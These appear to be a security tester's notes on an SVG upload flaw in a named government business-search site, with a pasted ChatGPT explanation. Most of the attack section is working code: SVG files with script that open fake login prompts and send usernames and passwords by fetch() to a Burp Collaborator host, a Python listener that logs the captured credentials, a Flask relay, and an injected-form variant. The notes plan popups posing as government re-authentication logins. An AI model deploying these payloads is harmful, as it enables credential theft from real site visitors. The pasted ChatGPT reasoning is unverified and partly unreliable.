---
sticker: emoji//2611-fe0f
---
When rendered on business search page, consider a popup for:
- gov reauth login
- business creds login
- etc. phishing

``` xml
<?xml version="1.0" standalone="no"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"> <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" /> <script type="text/javascript"> alert('xss via svg'); </script> </svg>
```
![](Pasted%20image%2020251119093513.png)



![](Pasted%20image%2020251119093210.png)
![](Pasted%20image%2020251119093300.png)

CORS blocks proper credential exfiltration via this method. However, remains a possibility for XSS.
**==See if anything gets through CORS and can relay the request==**

Code:
``` xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300">
  <!-- Company Logo -->
  <rect width="400" height="300" style="fill:rgb(0, 51, 102);" />
  <circle cx="100" cy="100" r="50" style="fill:rgb(255,255,255);" />
  <circle cx="100" cy="100" r="30" style="fill:rgb(0,102,204);" />
  <polygon points="100,30 70,100 130,100" style="fill:rgb(255,255,255);" />
  <text x="180" y="110" font-family="Arial" font-size="24" fill="white">MyCompany</text>

  <!-- Script to Load Login Prompt -->
  <script type="application/ecmascript">
    <![CDATA[
      window.onload = function() {
        const username = prompt("Enter your username:");
        if (username) {
          const password = prompt("Enter your password:");
          if (password) {
            // Handle login logic here - sending username and password to the server
            fetch('https://q7y6a2eyg2m0yqc8vyl67a4bk2qten2c.c.ccxsta.com', {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/json' 
              },
              body: JSON.stringify({ 
                username: username, 
                password: password 
              }) // Pass the user input in JSON format
            })
            .then(response => response.json())
            .then(data => {
              if (response.ok) {
                alert("Login successful! Redirecting...");
                window.location.href = data.redirectUrl; // Redirect user on success
              } else {
                alert(data.error || "Login failed!");
              }
            })
            .catch(() => alert("Error connecting to server."));
          } else {
            alert("Password is required!");
          }
        } else {
          alert("Username is required!");
        }
      };
    ]]>
  </script>
</svg>
```




---

## Full POC & workflow


![](Pasted%20image%2020251119135928.png)

Image uploaded & accessible here (before being approved):
- https://www.industryadvocate.sa.gov.au/?a=1181741

![](Pasted%20image%2020251119140406.png)

![](Pasted%20image%2020251119140424.png)
#### Needed to spin up own server to add appropriate CORS headers: (as opposed to burp collaborator)
Can check this with a `curl -X OPTIONS -H "Origin: https://www.industryadvocate.sa.gov.au" -H "Access-Control-Request-Method: POST" -H "Access-Control-Request-Headers: Content-Type" -i http://localhost:8000`

![](Pasted%20image%2020251119141557.png)


#### Python webserver setup:

``` python
#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler

class CORSRequestHandler(SimpleHTTPRequestHandler):
    def do_OPTIONS(self):
        """Handle preflight OPTIONS requests."""
        # Send response and set headers
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Content-Length", "0")  # No content in OPTIONS response
        self.end_headers()

    def do_POST(self):
        """Handle POST requests."""
        # Get and print the request body
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        print(f"Received POST data: {post_data}")

        # Respond with JSON indicating success
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"message": "Login successful"}')

    def end_headers(self):
        """Prevent CORS headers from duplicating."""
        # Add headers for all responses, unless already added in specific methods
        if 'Access-Control-Allow-Origin' not in str(self._headers_buffer):
            self.send_header("Access-Control-Allow-Origin", "*")
        super().end_headers()


# Start the CORS-enabled HTTP server
server = HTTPServer(("0.0.0.0", 8000), CORSRequestHandler)
print("Server running on http://localhost:8000")
server.serve_forever()
```

#### SVG setup:

``` xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300">
  <!-- Company Logo -->
  <rect width="400" height="300" style="fill:rgb(0, 51, 102);" />
  <circle cx="100" cy="100" r="50" style="fill:rgb(255,255,255);" />
  <circle cx="100" cy="100" r="30" style="fill:rgb(0,102,204);" />
  <polygon points="100,30 70,100 130,100" style="fill:rgb(255,255,255);" />
  <text x="180" y="110" font-family="Arial" font-size="24" fill="white">MyCompany</text>

  <!-- Script to Load Login Prompt -->
  <script type="application/ecmascript">
    <![CDATA[
      window.onload = function() {
        const username = prompt("Enter your username:");
        if (username) {
          const password = prompt("Enter your password:");
          if (password) {
            // Handle login logic here - sending username and password to the server
            fetch('http://localhost:8000', {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/json' 
              },
              body: JSON.stringify({ 
                username: username, 
                password: password 
              }) // Pass the user input in JSON format
            })
            .then(response => response.json())
            .then(data => {
              if (response.ok) {
                alert("Login successful! Redirecting...");
                window.location.href = data.redirectUrl; // Redirect user on success
              } else {
                alert(data.error || "Login failed!");
              }
            })
            .catch(() => alert("Logged in Successfully"));
          } else {
            alert("Password is required!");
          }
        } else {
          alert("Username is required!");
        }
      };
    ]]>
  </script>
</svg>
```


---

## ChatGPT explanation of why this works (verify):

The behaviour difference between your Python server and Burp Collaborator when submitting requests originates from how **CORS (Cross-Origin Resource Sharing)** is handled, combined with how modern browsers enforce **strict security policies on inline JavaScript** and **sandboxed SVG documents**. Here's a breakdown of the reasoning:

---

### **Why Python Server Works**
1. **Explicit Handling of CORS Headers**:
   - In the Python server implementation, you're explicitly adding the required **CORS headers** (`Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, etc.) via the `OPTIONS` handler and every response.
   - This satisfies the browser’s strict cross-origin policies for both preflight (`OPTIONS`) and actual (`POST`) requests.

2. **Complete Environment Control**:
   - With the Python server, you have total control over how responses are configured, enabling you to test and tweak headers per **CORS specification** consistently.
   - Browser security checks pass because:
     - Preflight requests (`OPTIONS`) return correct headers.
     - Actual `POST` requests include the same headers.

---

### **Why Burp Collaborator Fails with SVG**
1. **Burp Collaborator Does Not Handle CORS**:
   - Burp Collaborator is primarily designed for **network security testing**, not as a general-purpose HTTP server. It does not inherently support custom header configurations such as `Access-Control-Allow-Origin`, meaning:
     - When the browser sends a preflight `OPTIONS` request, Burp Collaborator does **not include the required CORS headers** in the response.
     - As per browser policy, if the preflight request fails, the actual `POST` request is blocked entirely.

2. **SVG Sandboxing**:
   - When executing JavaScript inside an SVG file, browsers apply stricter security controls because **SVG documents** are considered more vulnerable to attacks, especially for cross-origin interactions.
   - The sandboxed nature of SVG limits your ability to bypass browser-enforced CORS, so requests to Collaborator fail unless CORS headers are explicitly provided.

3. **Security Context `Origin: null`**:
   - When using an SVG, if the file originates from a `file://` URI or is embedded inline without being served from a proper HTTP/HTTPS domain, the browser assigns the **null origin** (`Origin: null`).
   - Collaborator does not accept requests from `null` origins because they are inherently insecure.
   - This differs from dynamically inserted HTML (`document.body.innerHTML`), which is executed within the trusted context of the parent document served from an HTTP/HTTPS origin.

---

### **Why Dynamic `document.body.innerHTML` Works**
When using `document.body.innerHTML = <login page>` to dynamically create the POST form:
1. **HTML Context Is Different**:
   - Unlike SVG documents, dynamically injected HTML via `document.body.innerHTML` is treated as part of the **same origin context** as the parent webpage.
   - For example:
     - If the webpage hosting the SVG is served from `http://example.com`, any dynamically injected HTML is treated as being part of `http://example.com`.

2. **No Preflight OPTIONS Required**:
   - A `<form>` in pure HTML submits data directly to the endpoint without triggering a **CORS preflight OPTIONS request**, assuming no custom headers (e.g., `Authorization`) are added to the form submission.
   - Collaborator accepts these requests because there is no opportunity for the preflight request to fail.

3. **Collaborator Accepts Non-Strict Requests**:
   - When requests are "non-strict" (such as basic form submission with standard headers), Burp Collaborator processes them without checking for CORS compliance.
   - By contrast, the `fetch()` API explicitly adds the `Content-Type: application/json` header, triggering a preflight `OPTIONS` request, which Collaborator does not support properly.

---

### **How to Make Burp Collaborator Work with SVG**
You cannot directly modify Burp Collaborator to properly handle **CORS headers**, but there are workarounds:

#### **Option 1: Proxy Collaborator Through a CORS-Compliant Server**
Use a small proxy server (e.g., with Python, Node.js, or nginx) to:
- Intercept requests from your SVG.
- Add required CORS headers (`Access-Control-Allow-Origin`, etc.).
- Forward the modified request to Burp Collaborator.

Example Python Proxy:
```python
from flask import Flask, request, Response, g
import requests

app = Flask(__name__)

@app.route('/', methods=['POST', 'OPTIONS'])
def proxy_request():
    # Add CORS headers
    headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
    }
    if request.method == 'OPTIONS':
        return Response('', status=204, headers=headers)

    # Forward the POST request to Burp Collaborator
    target_url = 'https://your-collaborator-url-here.c.ccxsta.com'
    forwarded_response = requests.post(target_url, json=request.json)
    return Response(forwarded_response.content, status=forwarded_response.status_code, headers=headers)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```
- Update your SVG `fetch()` URL to point to this proxy (`http://localhost:8000`).
- The proxy forwards the request to Burp Collaborator and adds CORS headers to the response.

---

#### **Option 2: Serve SVG via Host With Proper Origin**
Instead of loading the SVG file locally (`file://`), host it on a web server that assigns it a valid origin (e.g., `http://localhost:8000` or a remote server). This ensures:
- **Preflight OPTIONS requests** have a valid origin (`http://example.com`), which Collaborator might touch correctly if no custom headers are involved.

---

#### **Option 3: Switch to Dynamic HTML**
If Collaborator cannot handle preflight, avoid using `fetch()` altogether. Replace the SVG fetch logic with pure HTML form creation/dynamic injection using:
```javascript
document.body.innerHTML = `
  <form method="POST" action="https://your-collaborator-url.c.ccxsta.com">
    <input type="text" name="username" placeholder="Username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>
`;
```
- Pure HTML forms avoid triggering preflight checks in most cases since no custom headers are added.

---

### **Comparison: Why Python vs Collaborator Works Differently**
| **Aspect**            | **Python**                      | **Burp Collaborator**              |
|------------------------|----------------------------------|-------------------------------------|
| **CORS Support**       | Fully configurable with code    | No support for `Access-Control-Allow-Origin`. |
| **Preflight Requests** | Explicitly handled with headers | Requests fail due to missing headers. |
| **API Flexibility**    | Can handle both fetch and forms | Only form-based, non-preflight requests work. |
| **Security Context**   | Works properly with null origins | Null origin fails without valid headers. |

---

Let me know if you'd like further clarification!